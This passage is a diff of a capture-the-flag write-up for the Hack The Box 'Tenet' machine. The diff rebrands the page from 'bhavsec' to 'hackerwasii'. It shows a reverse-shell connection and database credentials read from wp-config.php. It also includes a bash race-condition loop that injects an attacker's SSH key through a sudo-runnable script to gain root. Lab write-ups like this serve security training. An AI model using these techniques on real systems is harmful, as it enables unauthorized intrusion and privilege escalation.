+          <pre><code>┌──(root💀kali)-[~/htb/tenet]
 └─# ncl
 listening on [any] 9001 ...
 connect to [10.10.14.172] from (UNKNOWN) [10.129.158.233] 43438
 ls
-bhavsec.php
+hackerwasii.php
 index.html
 sator.php
 sator.php.bak
 users.txt
 wordpress
-</code></pre><h3 id="lets-go-to-wordpress-directory-and-view-content-of-wp-configphp">Let&rsquo;s go to wordpress directory and view content of wp-config.php</h3>
-<pre><code>cd wordpress
+</code></pre>
+          <h3 id="lets-go-to-wordpress-directory-and-view-content-of-wp-configphp">
+            Let&rsquo;s go to wordpress directory and view content of
+            wp-config.php
+          </h3>
+          <pre><code>cd wordpress
 ls -la
 total 228
 drwxr-xr-x  5 www-data www-data  4096 May 27 15:08 .
@@ -491,8 +578,16 @@ drwxr-xr-x 25 www-data www-data 12288 Dec  8 22:13 wp-includes
 -rw-r--r--  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
 -rw-r--r--  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
 -rw-r--r--  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
-</code></pre><p>MYSQL Database Credentials revealed</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> );
+</code></pre>
+          <p>MYSQL Database Credentials revealed</p>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-php" data-lang="php"><span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;wordpress&#39;</span> );
 
 <span style="color:#e6db74">/** MySQL database username */</span>
 <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;neil&#39;</span> );
@@ -502,18 +597,27 @@ drwxr-xr-x 25 www-data www-data 12288 Dec  8 22:13 wp-includes
 
 <span style="color:#e6db74">/** MySQL hostname */</span>
 <span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> );
-</code></pre></div><h3 id="ssh-login-successful">SSH Login Successful</h3>
-<pre><code>neil@tenet:~$ whoami
+</code></pre>
+          </div>
+          <h3 id="ssh-login-successful">SSH Login Successful</h3>
+          <pre><code>neil@tenet:~$ whoami
 neil
 neil@tenet:~$ id
 uid=1001(neil) gid=1001(neil) groups=1001(neil)
 neil@tenet:~$ 
-</code></pre><h3 id="user-owned">User Owned</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210527124153321.png" alt="image-20210527124153321"></p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="sudo--l-results">sudo -l results</h3>
-<p>seems like we can execute <code>/user/local/bin/enable.sh</code> script.</p>
-<pre><code>neil@tenet:~$ sudo -l
+</code></pre>
+          <h3 id="user-owned">User Owned</h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210527124153321.png"
+              alt="image-20210527124153321" />
+          </p>
+          <h2 id="privilege-escalation">Privilege Escalation</h2>
+          <h3 id="sudo--l-results">sudo -l results</h3>
+          <p>
+            seems like we can execute
+            <code>/user/local/bin/enable.sh</code> script.
+          </p>
+          <pre><code>neil@tenet:~$ sudo -l
 Matching Defaults entries for neil on tenet:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
@@ -522,9 +626,18 @@ User neil may run the following commands on tenet:
     (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
 neil@tenet:~$ ls -la /usr/local/bin/enableSSH.sh
 -rwxr-xr-x 1 root root 1080 Dec  8 13:46 /usr/local/bin/enableSSH.sh
-</code></pre><h3 id="enablesshsh-file">enableSSH.sh file</h3>
-<pre><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
-</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</code></pre>
+          <h3 id="enablesshsh-file">enableSSH.sh file</h3>
+          <pre><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+</code></pre>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>
 checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
 
@@ -575,8 +688,12 @@ addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
 key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
 addKey
 checkAdded
-</code></pre></div><h3 id="the-addkey-function-look-interesting">The addkey() function look interesting.</h3>
-<pre><code>addKey() {
+</code></pre>
+          </div>
+          <h3 id="the-addkey-function-look-interesting">
+            The addkey() function look interesting.
+          </h3>
+          <pre><code>addKey() {
 
 	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
 
@@ -592,113 +709,120 @@ checkAdded
 
 }
 
-</code></pre><h3 id="lets-see-whats-the-script-doing">Let&rsquo;s see what&rsquo;s the script doing.</h3>
-<p>This script writes a <code>id_rsa.pub</code> key defined in key to a randomly generated file format of <code>/tmp/ssh-XXXXXXXX</code> and then copies the contents of the file to the <code>known_hosts</code> of the root And then deletes the tmp file.</p>
-<p>We have Permission to <code>write</code> the file. Let&rsquo;s replace root <code>SSH_PUB_KEY</code> with our&rsquo;s ssh <code>public</code> key.</p>
-<p>So, if we can write our own <code>ssh-key</code> to the tmp file before it gets copied to <code>known_hosts</code>, our key will get written to <code>known_hosts</code> and we can ssh into root.</p>
-<p>Let&rsquo;s write an <code>infinite</code> while loop in bash that <code>continuously</code> writes our ssh key to any file of format <code>/tmp/ssh-XXXXXXXX</code> using wild character. And while this runs, we run the <code>script</code> as sudo a number of times</p>
-<h3 id="copy-our-ssh-public-key-from-kali-machine">Copy our SSH Public key from kali machine</h3>
-<p>Then, run the <code>while</code> loop Then run the <code>sudo</code> command 3-4 times.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiEineElLAoGzPWrR9VyNhxamU4uHkmdj9tzf725FwMUKWlhbH2xKa3VYJ1lRd9BpSqNgR/vtB4YAA/Z83AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDnKvwBAb7sNFaP6ZeKd7Lp9EX0mw0C/phr39KnWn5dqb9AAAAAAAAAAAAAAAAAAAAAAAtKrfrm2dxrbQJCsVY0+3IkDvaUZXtUuoCVY5wJkxK1AijEU3c= root@kali&#34;</span> | tee /tmp/ssh* &gt; /dev/null; <span style="color:#66d9ef">done</span>
-</code></pre></div><h3 id="root-owned">Root Owned</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210527131706701.png" alt="image-20210527131706701"></p>
-<p> </p>
-<p>Thanks for reading this post, if you like my work you can support by <a href="https://www.buymeacoffee.com/bhavsec">buying me a coffee</a>. ☕️</p>
+</code></pre>
+          <h3 id="lets-see-whats-the-script-doing">
+            Let&rsquo;s see what&rsquo;s the script doing.
+          </h3>
+          <p>
+            This script writes a <code>id_rsa.pub</code> key defined in key to
+            a randomly generated file format of
+            <code>/tmp/ssh-XXXXXXXX</code> and then copies the contents of the
+            file to the <code>known_hosts</code> of the root And then deletes
+            the tmp file.
+          </p>
+          <p>
+            We have Permission to <code>write</code> the file. Let&rsquo;s
+            replace root <code>SSH_PUB_KEY</code> with our&rsquo;s ssh
+            <code>public</code> key.
+          </p>
+          <p>
+            So, if we can write our own <code>ssh-key</code> to the tmp file
+            before it gets copied to <code>known_hosts</code>, our key will
+            get written to <code>known_hosts</code> and we can ssh into root.
+          </p>
+          <p>
+            Let&rsquo;s write an <code>infinite</code> while loop in bash that
+            <code>continuously</code> writes our ssh key to any file of format
+            <code>/tmp/ssh-XXXXXXXX</code> using wild character. And while
+            this runs, we run the <code>script</code> as sudo a number of
+            times
+          </p>
+          <h3 id="copy-our-ssh-public-key-from-kali-machine">
+            Copy our SSH Public key from kali machine
+          </h3>
+          <p>
+            Then, run the <code>while</code> loop Then run the
+            <code>sudo</code> command 3-4 times.
+          </p>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiEineElLAoGzPWrR9VyNhxamU4uHkmdj9tzf725FwMUKWlhbH2xKa3VYJ1lRd9BpSqNgR/vtB4YAA/Z83AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDnKvwBAb7sNFaP6ZeKd7Lp9EX0mw0C/phr39KnWn5dqb9AAAAAAAAAAAAAAAAAAAAAAAtKrfrm2dxrbQJCsVY0+3IkDvaUZXtUuoCVY5wJkxK1AijEU3c= root@kali&#34;</span> | tee /tmp/ssh* &gt; /dev/null; <span style="color:#66d9ef">done</span>
+</code></pre>
+          </div>
+          <h3 id="root-owned">Root Owned</h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210527131706701.png"
+              alt="image-20210527131706701" />
+          </p>
+          <p> </p>
+          <p>
+            Thanks for reading this post, if you like my work you can support
+            by
+            <a href="https://www.buymeacoffee.com/hackerwasii">buying me a coffee</a>. ☕️
+          </p>
+        </div>
 
-    </div>
-    
-      
         <div class="pagination">
           <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
+            <span class="pagination__title-h">Read other posts</span>
             <hr />
           </div>
           <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://bhavsec.com/posts/buff-freefloatftp/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">FreeFloat FTP Buffer Overflow 🪣💦</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="https://bhavsec.com/posts/mssql-rce/">
-                  <span class="button__text">From MSSQL to RCE 🚀</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
+            <span class="button previous">
+              <a href="https://www.hackerwasii.com/posts/buff-freefloatftp/">
+                <span class="button__icon">←</span>
+                <span class="button__text">FreeFloat FTP Buffer Overflow 🪣💦</span>
+              </a>
+            </span>
+
+            <span class="button next">
+              <a href="https://www.hackerwasii.com/posts/mssql-rce/">
+                <span class="button__text">From MSSQL to RCE 🚀</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
           </div>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
       </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      
-      <div class="copyright">
-        <span> 
-          © 2018-2022
-        </span>
-      </div>
-      <div>
-        <span>    
-        <span>
-        <a href="../../archive">archive</a>
-        &nbsp; 
-        </span>
-          <a href="../../newsletter">newsletter</a>
-        </span>   
-        &nbsp;      
-        <span>
-          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
-        </span>
-        &nbsp;      
-        <span>
-          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
-        </span>
-
-      </div>
-
-    
-  </div>
-</footer>
-
-<script src="../../assets/main.js"></script>
-<script src="../../assets/prism.js"></script>
-
-      
     </div>
+    <!-- hackerwasii -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="1081579313"
+      data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <footer class="footer">
+      <div class="footer__inner">
+        <div class="copyright">
+          <span> © 2020-2022 Waseem Akram</span>
+        </div>
+        <div>
+          <span>
+            <span>
+              <a href="../../archive">archive</a>
+              &nbsp;
+            </span>
+            <a href="../../newsletter">newsletter</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="”_blank”">license</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://www.hackerwasii.com/posts/index.xml" target="”_blank”">rss feed</a>
+          </span>
+        </div>
+      </div>
+    </footer>
+    <script src="../../assets/main.js"></script>
+    <script src="../../assets/prism.js"></script>
+  </div>
+</body>
 
-    
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
-}
-</script>
-
-    
-  </body>
 </html>
